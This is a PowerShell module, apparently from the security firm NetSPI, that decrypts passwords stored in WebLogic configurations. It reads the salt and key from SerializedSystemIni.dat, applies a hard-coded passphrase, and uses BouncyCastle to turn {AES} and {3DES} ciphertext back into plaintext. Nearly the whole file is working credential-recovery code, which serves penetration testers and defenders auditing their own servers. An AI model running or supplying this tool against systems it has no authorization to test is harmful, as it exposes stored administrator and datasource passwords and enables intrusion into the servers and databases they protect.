<#
    Author: Eric Gruber 2015, NetSPI
    .Synopsis
    PowerShell script to decrypt WebLogic passwords
    .EXAMPLE
    Invoke-WebLogicPasswordDecryptor -SerializedSystemIni C:\SerializedSystemIni.dat -CipherText "{3DES}JMRazF/vClP1WAgy1czd2Q=="
    .EXAMPLE
    Invoke-WebLogicPasswordDecryptor -SerializedSystemIni C:\SerializedSystemIni.dat -CipherText "{AES}8/rTjIuC4mwlrlZgJK++LKmAThcoJMHyigbcJGIztug="
#>
function Invoke-WebLogicPasswordDecryptor
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory = $true,
        Position = 0)]
        [String]
        $SerializedSystemIni,

        [Parameter(Mandatory = $true,
        Position = 0)]
        [String]
        $CipherText,

        [Parameter(Mandatory = $false,
        Position = 0)]
        [String]
        $BouncyCastle
    )

    if (!$BouncyCastle)
    {
        $BouncyCastle = '.\BouncyCastle.Crypto.dll'
    }

    Add-Type -Path $BouncyCastle

    $Pass = '0xccb97558940b82637c8bec3c770f86fa3a391a56'
    $Pass = $Pass.ToCharArray()

    if ($CipherText.StartsWith('{AES}'))
    {
        $CipherText = $CipherText.TrimStart('{AES}')
    }
    elseif ($CipherText.StartsWith('{3DES}'))
    {
        $CipherText = $CipherText.TrimStart('{3DES}')
    }

    $DecodedCipherText = [System.Convert]::FromBase64String($CipherText)

    $BinaryReader = New-Object -TypeName System.IO.BinaryReader -ArgumentList ([System.IO.File]::Open($SerializedSystemIni, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite))
    $NumberOfBytes = $BinaryReader.ReadByte()
    $Salt = $BinaryReader.ReadBytes($NumberOfBytes)
    $Version = $BinaryReader.ReadByte()
    $NumberOfBytes = $BinaryReader.ReadByte()
    $EncryptionKey = $BinaryReader.ReadBytes($NumberOfBytes)

    if ($Version -ge 2)
    {
        $NumberOfBytes = $BinaryReader.ReadByte()
        $EncryptionKey = $BinaryReader.ReadBytes($NumberOfBytes)

        $ClearText = Invoke-DecryptAES -Salt $Salt -EncryptionKey $EncryptionKey -Pass $Pass -DecodedCipherText $DecodedCipherText
    }
    else
    {
        $ClearText = Invoke-Decrypt3DES -Salt $Salt -EncryptionKey $EncryptionKey -Pass $Pass -DecodedCipherText $DecodedCipherText
    }

    Write-Output $ClearText
}

function Invoke-DecryptAES
{
    param
    (
        [byte[]]
        $Salt,

        [byte[]]
        $EncryptionKey,

        [char[]]
        $Pass,

        [byte[]]
        $DecodedCipherText
    )

    $EncryptionCipher = 'AES/CBC/PKCS5Padding'

    $EncryptionKeyCipher = 'PBEWITHSHAAND128BITRC2-CBC'

    $IV = New-Object -TypeName byte[] -ArgumentList 16

    [array]::Copy($DecodedCipherText,0,$IV, 0 ,16)

    $CipherText = New-Object -TypeName byte[] -ArgumentList ($DecodedCipherText.Length - 16)
    [array]::Copy($DecodedCipherText,16,$CipherText,0,($DecodedCipherText.Length - 16))


    $AlgorithmParameters = [Org.BouncyCastle.Security.PbeUtilities]::GenerateAlgorithmParameters($EncryptionKeyCipher,$Salt,5)

    $CipherParameters = [Org.BouncyCastle.Security.PbeUtilities]::GenerateCipherParameters($EncryptionKeyCipher,$Pass,$AlgorithmParameters)


    $KeyCipher = [Org.BouncyCastle.Security.PbeUtilities]::CreateEngine($EncryptionKeyCipher)
    $KeyCipher.Init($false, $CipherParameters)

    $Key = $KeyCipher.DoFinal($EncryptionKey)


    $Cipher = [Org.BouncyCastle.Security.CipherUtilities]::GetCipher($EncryptionCipher)
    $KeyParameter = [Org.BouncyCastle.Crypto.Parameters.KeyParameter] $Key
    $ParametersWithIV = [Org.BouncyCastle.Crypto.Parameters.ParametersWithIV]::new($KeyParameter , $IV)

    $Cipher.Init($false, $ParametersWithIV)
    $ClearText = $Cipher.DoFinal($CipherText)

    [System.Text.Encoding]::ASCII.GetString($ClearText)
}

function Invoke-Decrypt3DES
{
    param
    (
        [byte[]]
        $Salt,

        [byte[]]
        $EncryptionKey,

        [char[]]
        $Pass,

        [byte[]]
        $DecodedCipherText
    )

    $EncryptionCipher = 'DESEDE/CBC/PKCS5Padding'

    $EncryptionKeyCipher = 'PBEWITHSHAAND128BITRC2-CBC'

    $IV = New-Object -TypeName byte[] -ArgumentList 8

    [array]::Copy($Salt,0,$IV, 0 ,4)
    [array]::Copy($Salt,0,$IV, 4 ,4)

    $AlgorithmParameters = [Org.BouncyCastle.Security.PbeUtilities]::GenerateAlgorithmParameters($EncryptionKeyCipher,$Salt,5)
    $CipherParameters = [Org.BouncyCastle.Security.PbeUtilities]::GenerateCipherParameters($EncryptionKeyCipher,$Pass,$AlgorithmParameters)

    $KeyCipher = [Org.BouncyCastle.Security.PbeUtilities]::CreateEngine($EncryptionKeyCipher)
    $KeyCipher.Init($false, $CipherParameters)

    $Key = $KeyCipher.DoFinal($EncryptionKey)

    $Cipher = [Org.BouncyCastle.Security.CipherUtilities]::GetCipher($EncryptionCipher)
    $KeyParameter = [Org.BouncyCastle.Crypto.Parameters.KeyParameter] $Key
    $ParametersWithIV = [Org.BouncyCastle.Crypto.Parameters.ParametersWithIV]::new($KeyParameter , $IV)

    $Cipher.Init($false, $ParametersWithIV)
    $ClearText = $Cipher.DoFinal($DecodedCipherText)

    [System.Text.Encoding]::ASCII.GetString($ClearText)
}

Export-ModuleMember -Function Invoke-WebLogicPasswordDecryptor
